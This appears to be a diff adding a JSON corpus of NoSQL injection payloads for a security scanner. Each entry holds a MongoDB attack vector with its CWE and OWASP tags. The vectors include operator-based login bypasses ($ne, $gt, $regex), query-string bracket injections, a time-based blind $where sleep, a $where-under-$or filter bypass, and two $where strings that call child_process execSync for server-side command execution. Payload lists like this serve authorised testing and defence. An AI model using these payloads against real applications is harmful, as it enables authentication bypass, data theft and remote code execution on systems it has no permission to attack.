@@ -1,0 +1,2568 @@
+{
+  "version": "5.1.0",
+  "category": "nosql_injection",
+  "payloads": [
+    {
+      "id": "nosqli.op.ne_null",
+      "vector": "{\"$ne\": null}",
+      "description": "MongoDB $ne operator injection in a JSON body.",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "engines": [
+        "mongodb"
+      ],
+      "references": [
+        "https://portswigger.net/web-security/nosql-injection"
+      ],
+      "tags": [
+        "mongo",
+        "ne"
+      ]
+    },
+    {
+      "id": "nosqli.op.gt_empty",
+      "vector": "{\"$gt\": \"\"}",
+      "description": "MongoDB $gt operator (matches any string).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "engines": [
+        "mongodb"
+      ],
+      "tags": [
+        "mongo",
+        "gt"
+      ]
+    },
+    {
+      "id": "nosqli.op.regex_any",
+      "vector": "{\"$regex\": \".*\"}",
+      "description": "MongoDB $regex matching everything.",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "engines": [
+        "mongodb"
+      ],
+      "tags": [
+        "mongo",
+        "regex"
+      ]
+    },
+    {
+      "id": "nosqli.auth.login_bypass",
+      "vector": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+      "description": "Authentication bypass via operator injection on both fields.",
+      "context": "auth_bypass",
+      "cwe": "CWE-943",
+      "owasp": "A07:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "engines": [
+        "mongodb"
+      ],
+      "tags": [
+        "mongo",
+        "login"
+      ]
+    },
+    {
+      "id": "nosqli.qs.operator_bracket",
+      "vector": "username[$ne]=x&password[$ne]=x",
+      "description": "Query-string bracket notation that Express/qs parses into operator objects.",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "engines": [
+        "mongodb"
+      ],
+      "tags": [
+        "querystring",
+        "login"
+      ]
+    },
+    {
+      "id": "nosqli.where.return_true",
+      "vector": "{\"$where\": \"return true\"}",
+      "description": "$where server-side JS predicate always true.",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "engines": [
+        "mongodb"
+      ],
+      "tags": [
+        "mongo",
+        "where"
+      ]
+    },
+    {
+      "id": "nosqli.where.under_or",
+      "vector": "{\"$or\":[{\"$where\":\"return true\"}]}",
+      "description": "$where nested under $or — bypassed top-level $where filters (CVE-2025-23061 class).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "waf_bypass": true,
+      "engines": [
+        "mongodb"
+      ],
+      "references": [
+        "https://www.invicti.com/blog/web-security/nosql-injection-cheat-sheet"
+      ],
+      "tags": [
+        "mongo",
+        "where",
+        "filter-bypass"
+      ]
+    },
+    {
+      "id": "nosqli.where.sleep_blind",
+      "vector": "{\"$where\": \"sleep(5000)\"}",
+      "description": "Time-based blind via $where sleep().",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "time_based": true,
+      "engines": [
+        "mongodb"
+      ],
+      "tags": [
+        "mongo",
+        "blind"
+      ]
+    },
+    {
+      "id": "nosqli.func.function_blind",
+      "vector": "{\"$where\": \"function(){return this.a==this.a}\"}",
+      "description": "$where function form.",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "engines": [
+        "mongodb"
+      ],
+      "tags": [
+        "mongo",
+        "function"
+      ]
+    },
+    {
+      "id": "nosqli.js.or_string_eval",
+      "vector": "' || '1'=='1",
+      "description": "String-concatenation JS eval bypass (older Mongo drivers building JS).",
+      "context": "auth_bypass",
+      "cwe": "CWE-943",
+      "owasp": "A07:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "js-eval"
+      ]
+    },
+    {
+      "id": "nosqli.js.admin_or_eval",
+      "vector": "admin' || '1'=='1",
+      "description": "JS eval auth bypass with a known username.",
+      "context": "auth_bypass",
+      "cwe": "CWE-943",
+      "owasp": "A07:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "js-eval",
+        "login"
+      ]
+    },
+    {
+      "id": "nosqli.graphql.operator_variable",
+      "vector": "{\"filter\":{\"role\":{\"$ne\":\"guest\"}}}",
+      "description": "Operator object smuggled through a GraphQL JSON variable.",
+      "context": "graphql",
+      "cwe": "CWE-943",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "engines": [
+        "mongodb"
+      ],
+      "tags": [
+        "graphql"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.020b7fc0df",
+      "vector": "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$ne\": \"\"}, \"$where\": \"sleep(1000)\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "nosql_injection.legacy.0254331065",
+      "vector": "{\"username\": {\"$elemMatch\": {\"$eq\": \"admin\"}}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.02ec12448b",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isLocked == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.02f097aa21",
+      "vector": "username[$in][]=admin&username[$in][]=administrator",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.03afe9b385",
+      "vector": "{\"username\": {\"$type\": \"string\"}, \"password\": {\"$type\": \"string\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.0629c1564d",
+      "vector": "username[$exists]=true&password[$exists]=true",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.071b0016e8",
+      "vector": "{\"$jsonSchema\": {}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.09b54646d1",
+      "vector": "{\"username\": {\"$regex\": \"^(?=.*admin)\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.0a1f0d133d",
+      "vector": "{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$not\": {\"$eq\": \"guest\"}}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.0aa7573c06",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isOwner == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.0ac1c281d5",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isHR == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.0b1ba2a497",
+      "vector": "{\"username\": {\"$not\": {\"$size\": 0}}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.0c8daf2f73",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password.match(/.*/)//; return true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.0c968bedb6",
+      "vector": "{\"$where\": \"this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.0f159f4a24",
+      "vector": "username[$regex]=^admin&password[$ne]=x",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.100f113816",
+      "vector": "{\"$comment\": \"injection\", \"username\": \"admin\"}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.1309a67904",
+      "vector": "username=admin&password[$gt]=",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.13cb02fdf0",
+      "vector": "{\"username\": {\"$mod\": [10, 0]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.13d486fe3c",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isMarketing == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.151e6819f5",
+      "vector": "username[$eq]=admin&password[$regex]=^pass",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.176088f9e0",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.loginAttempts < 5; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.176caac64f",
+      "vector": "username[$regex]=.*&password[$regex]=.*",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.17d4512bc3",
+      "vector": "{\"permissions.write\": true}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.185e130bb5",
+      "vector": "{\"username\": {\"$regex\": \"^adm\", \"$options\": \"im\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.189d8a0896",
+      "vector": "{\"$accumulator\": {\"init\": \"function() {return true}\"}}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.19d76a224f",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.createdAt < new Date(); }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.1a78223fe9",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.updatedAt > new Date(0); }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.1bbef1639d",
+      "vector": "{\"username\": {\"$not\": {\"$eq\": \"guest\"}}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.1c106b4c87",
+      "vector": "{\"$where\": \"this.username == 'admin' && this.password != 'admin'\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.1d025b4cc1",
+      "vector": "username[$eq]=admin&password[$regex]=.*",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.1f1365381a",
+      "vector": "{\"field\": {\"$lt\": \"z\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.20c11b6ac4",
+      "vector": "{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$nin\": [null, \"\"]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.21642024da",
+      "vector": "{\"$exists\": true}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.224f8badab",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.lastLogin < new Date(); }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.2256de51e6",
+      "vector": "{\"username\": {\"$regex\": \"^(?!guest)\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.22d7e7edc4",
+      "vector": "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.2327a218a7",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isRejected == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.238f668091",
+      "vector": "{\"$where\": \"this.username == 'admin' && this.password.length > 0\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.2540831ae4",
+      "vector": "{\"$or\": [{\"username\": \"admin\"}, {\"role\": \"admin\"}]}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.263f2ba8fd",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isEnabled == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.265a3bac35",
+      "vector": "{\"username\": {\"$bitsAllSet\": [1, 5]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.29ff7d055a",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isTrusted == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.2ee2fada92",
+      "vector": "{\"$where\": \"this.username.match(/^adm/) || true\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "waf_bypass": true
+    },
+    {
+      "id": "nosql_injection.legacy.2f429fcc21",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isSuperUser == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.3075b53519",
+      "vector": "{\"username\": {\"$exists\": true}, \"$where\": \"this.username.length > 0\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.30ba77af04",
+      "vector": "{\"username\":\"admin\", \"$or\": [{\"password\":\"123\"}, {\"$where\":\"1==1\"}]}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.317a9b3fc8",
+      "vector": "{\"$where\": \"Object.prototype.toString.call(this.username) === '[object String]'\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.3207c7f2ae",
+      "vector": "{\"$where\": \"this.username && this.username.indexOf('admin') >= 0\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.32b55a4bc0",
+      "vector": "{\"updatedAt\": {\"$gt\": new Date('1970-01-01')}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.33507b6fe2",
+      "vector": "{\"$or\": [{\"username\": \"admin\"}, {\"username\": \"administrator\"}]}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.35c686af07",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isManager == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.39845ad966",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.permissions.delete == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.3c5acf4bb6",
+      "vector": "{\"field\": {\"$nin\": [\"value1\", \"value2\"]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.3d652aa6a7",
+      "vector": "user[$ne]=&pass[$ne]=",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.3e19da96e3",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isTestAccount == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.3ffbcb6d11",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isSupport == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.40f5ef9a15",
+      "vector": "{\"username\": {\"$size\": 5}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.41b34cf8a7",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isOperator == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.43cc72d8f0",
+      "vector": "{\"username\": {\"$in\": [null, \"\", \"admin\", \"administrator\"]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.442c8bfdcf",
+      "vector": "{\"username\": {\"$not\": {\"$type\": \"null\"}}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.45e9353f5e",
+      "vector": "{\"$where\": \"this.username == 'admin' && this.password.match(/.*/)\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.461c58ff52",
+      "vector": "{\"$where\": \"this[process.mainModule.require('child_process').execSync('id')]\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.476cacf2f5",
+      "vector": "{\"username\": {\"$type\": 2}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.47c5a65154",
+      "vector": "{\"username\": {\"$bitsAnySet\": [1, 5]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.4843d59741",
+      "vector": "{\"$func\": \"function() { return true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.489b9d2045",
+      "vector": "{\"username\": {\"$gt\": \"\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.48f2b4ac74",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.emailVerified == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.4925be9d76",
+      "vector": "{\"selector\": {\"_id\": {\"$gt\": null}}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.4a0de48e8d",
+      "vector": "{\"loginAttempts\": {\"$lt\": 999}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.4b88e5ae96",
+      "vector": "{\"accountLocked\": {\"$ne\": true}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.4f1c372858",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isBlocked == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
